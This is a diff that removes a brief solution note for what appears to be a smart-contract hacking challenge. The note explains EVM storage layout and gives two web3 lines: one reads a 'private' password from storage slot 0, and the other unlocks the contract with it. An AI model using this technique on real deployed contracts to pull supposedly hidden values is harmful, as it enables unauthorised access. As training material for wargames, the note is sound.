@@ -1,5 +1,0 @@
-EVM storage is 2^256 slots of 32 bytes, values are stored sequentially from the right. see Nicole Zhu
-
-Solution:
-let pw = await web3.eth.getStorageAt(instance, 0);
-await contract.unlock(pw);
